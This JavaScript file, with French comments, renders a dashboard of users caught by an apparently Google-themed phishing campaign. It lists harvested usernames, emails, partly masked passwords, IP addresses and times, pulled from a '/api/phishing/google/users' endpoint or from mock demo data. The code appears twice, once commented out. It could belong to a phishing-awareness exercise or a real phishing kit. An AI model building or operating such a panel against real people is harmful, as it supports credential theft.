// document.addEventListener('DOMContentLoaded', function() {
//     // Fonction pour charger les données utilisateurs depuis MariaDB via une API
//     async function loadUsers() {
//       try {
//         // Dans un environnement réel, cette URL pointera vers votre API backend
//         const response = await fetch('/api/phishing/google/users');
        
//         if (!response.ok) {
//           throw new Error('Erreur lors de la récupération des données');
//         }
        
//         const users = await response.json();
//         displayUsers(users);
//       } catch (error) {
//         console.error('Erreur:', error);
//         // Afficher un message d'erreur à l'utilisateur
//         document.getElementById('users-data').innerHTML = `
//           <tr>
//             <td colspan="7" style="text-align: center; color: #ff3366;">
//               Erreur de chargement des données. Veuillez réessayer.
//             </td>
//           </tr>
//         `;
//       }
//     }
    
//     // Fonction pour afficher les utilisateurs dans le tableau
//     function displayUsers(users) {
//       const tableBody = document.getElementById('users-data');
      
//       // Si aucun utilisateur n'est trouvé
//       if (users.length === 0) {
//         tableBody.innerHTML = `
//           <tr>
//             <td colspan="7" style="text-align: center;">
//               Aucun utilisateur n'a été piégé par cette campagne.
//             </td>
//           </tr>
//         `;
//         return;
//       }
      
//       // Générer les lignes du tableau
//       let html = '';
//       users.forEach(user => {
//         // Masquer partiellement le mot de passe pour la sécurité
//         const maskedPassword = user.password.substring(0, 2) + '•'.repeat(user.password.length - 2);
        
//         html += `
//           <tr>
//             <td>${user.id}</td>
//             <td>${user.username}</td>
//             <td>${user.email}</td>
//             <td>${maskedPassword}</td>
//             <td>${user.ip_address}</td>
//             <td>${formatDateTime(user.timestamp)}</td>
//             <td>
//               <button class="action-icon" title="Voir les détails">
//                 <i class="fas fa-eye"></i>
//               </button>
//               <button class="action-icon" title="Supprimer">
//                 <i class="fas fa-trash"></i>
//               </button>
//             </td>
//           </tr>
//         `;
//       });
      
//       tableBody.innerHTML = html;
      
//       // Ajouter des écouteurs d'événements pour les boutons d'action
//       document.querySelectorAll('.action-icon').forEach(button => {
//         button.addEventListener('click', function(e) {
//           e.preventDefault();
//           // Logique pour gérer les actions (à implémenter selon les besoins)
//           const action = this.getAttribute('title');
//           const row = this.closest('tr');
//           const userId = row.cells[0].textContent;
          
//           if (action === 'Voir les détails') {
//             console.log(`Afficher les détails pour l'utilisateur ${userId}`);
//             // Implémenter l'affichage des détails
//           } else if (action === 'Supprimer') {
//             console.log(`Supprimer l'utilisateur ${userId}`);
//             // Implémenter la suppression
//           }
//         });
//       });
//     }
    
//     // Fonction pour formater la date et l'heure
//     function formatDateTime(timestamp) {
//       const date = new Date(timestamp);
//       return date.toLocaleString('fr-FR', {
//         day: '2-digit',
//         month: '2-digit',
//         year: 'numeric',
//         hour: '2-digit',
//         minute: '2-digit'
//       });
//     }
    
//     // Charger les données pour la démonstration
//     // Pour la démonstration, nous allons simuler des données
//     const mockUsers = [
//       {
//         id: 1,
//         username: 'pierre.durand',
//         email: 'pierre.durand@example.com',
//         password: 'P@ssw0rd123',
//         ip_address: '192.168.1.45',
//         timestamp: '2025-04-09T09:23:15'
//       },
//       {
//         id: 2,
//         username: 'marie.laurent',
//         email: 'marie.l@company.fr',
//         password: 'Secure2025!',
//         ip_address: '192.168.1.87',
//         timestamp: '2025-04-09T10:15:22'
//       },
//       {
//         id: 3,
//         username: 'john.smith',
//         email: 'j.smith@example.com',
//         password: 'qwerty123',
//         ip_address: '192.168.2.15',
//         timestamp: '2025-04-08T16:42:33'
//       },
//       {
//         id: 4,
//         username: 'sophie.martin',
//         email: 'smartin@enterprise.com',
//         password: 'CompanyAccess22',
//         ip_address: '192.168.3.101',
//         timestamp: '2025-04-08T14:07:19'
//       },
//       {
//         id: 5,
//         username: 'thomas.bernard',
//         email: 't.bernard@example.org',
//         password: 'ThomasB2025',
//         ip_address: '192.168.1.201',
//         timestamp: '2025-04-07T11:35:44'
//       }
//     ];
    
//     // Afficher les données simulées
//     displayUsers(mockUsers);
    
//     // Dans une implémentation réelle, vous utiliseriez cette fonction à la place
//     // loadUsers();
//   });

document.addEventListener('DOMContentLoaded', function() {
    // Fonction pour charger les données utilisateurs depuis MariaDB via une API
    async function loadUsers() {
      try {
        // Dans un environnement réel, cette URL pointera vers votre API backend
        const response = await fetch('/api/phishing/google/users');
        
        if (!response.ok) {
          throw new Error('Erreur lors de la récupération des données');
        }
        
        const users = await response.json();
        displayUsers(users);
      } catch (error) {
        console.error('Erreur:', error);
        // Afficher un message d'erreur à l'utilisateur
        document.getElementById('users-data').innerHTML = `
          <tr>
            <td colspan="7" style="text-align: center; color: #ff3366;">
              Erreur de chargement des données. Veuillez réessayer.
            </td>
          </tr>
        `;
      }
    }
    
    // Fonction pour afficher les utilisateurs dans le tableau
    function displayUsers(users) {
      const tableBody = document.getElementById('users-data');
      
      // Si aucun utilisateur n'est trouvé
      if (users.length === 0) {
        tableBody.innerHTML = `
          <tr>
            <td colspan="7" style="text-align: center;">
              Aucun utilisateur n'a été piégé par cette campagne.
            </td>
          </tr>
        `;
        return;
      }
      
      // Générer les lignes du tableau
      let html = '';
      users.forEach(user => {
        // Masquer partiellement le mot de passe pour la sécurité
        const maskedPassword = user.password.substring(0, 2) + '•'.repeat(user.password.length - 2);
        
        html += `
          <tr>
            <td>${user.id}</td>
            <td>${user.username}</td>
            <td>${user.email}</td>
            <td>${maskedPassword}</td>
            <td>${user.ip_address}</td>
            <td>${formatDateTime(user.timestamp)}</td>
            <td>
              <button class="action-icon" title="Voir les détails">
                <i class="fas fa-eye"></i>
              </button>
              <button class="action-icon" title="Supprimer">
                <i class="fas fa-trash"></i>
              </button>
            </td>
          </tr>
        `;
      });
      
      tableBody.innerHTML = html;
      
      // Ajouter des écouteurs d'événements pour les boutons d'action
      document.querySelectorAll('.action-icon').forEach(button => {
        button.addEventListener('click', function(e) {
          e.preventDefault();
          // Logique pour gérer les actions (à implémenter selon les besoins)
          const action = this.getAttribute('title');
          const row = this.closest('tr');
          const userId = row.cells[0].textContent;
          
          if (action === 'Voir les détails') {
            console.log(`Afficher les détails pour l'utilisateur ${userId}`);
            // Implémenter l'affichage des détails
          } else if (action === 'Supprimer') {
            console.log(`Supprimer l'utilisateur ${userId}`);
            // Implémenter la suppression
          }
        });
      });
    }
    
    // Fonction pour formater la date et l'heure
    function formatDateTime(timestamp) {
      const date = new Date(timestamp);
      return date.toLocaleString('fr-FR', {
        day: '2-digit',
        month: '2-digit',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit'
      });
    }
    
    // Données de démonstration pour simuler la récupération depuis MariaDB
    const mockUsers = [
      {
        id: 1,
        username: 'pierre.durand',
        email: 'pierre.durand@example.com',
        password: 'P@ssw0rd123',
        ip_address: '192.168.1.45',
        timestamp: '2025-04-09T09:23:15'
      },
      {
        id: 2,
        username: 'marie.laurent',
        email: 'marie.l@company.fr',
        password: 'Secure2025!',
        ip_address: '192.168.1.87',
        timestamp: '2025-04-09T10:15:22'
      },
      {
        id: 3,
        username: 'john.smith',
        email: 'j.smith@example.com',
        password: 'qwerty123',
        ip_address: '192.168.2.15',
        timestamp: '2025-04-08T16:42:33'
      },
      {
        id: 4,
        username: 'sophie.martin',
        email: 'smartin@enterprise.com',
        password: 'CompanyAccess22',
        ip_address: '192.168.3.101',
        timestamp: '2025-04-08T14:07:19'
      },
      {
        id: 5,
        username: 'thomas.bernard',
        email: 't.bernard@example.org',
        password: 'ThomasB2025',
        ip_address: '192.168.1.201',
        timestamp: '2025-04-07T11:35:44'
      }
    ];
    
    // Afficher les données simulées
    displayUsers(mockUsers);
    
    // Dans une implémentation réelle, vous utiliseriez cette fonction à la place
    // loadUsers();
  });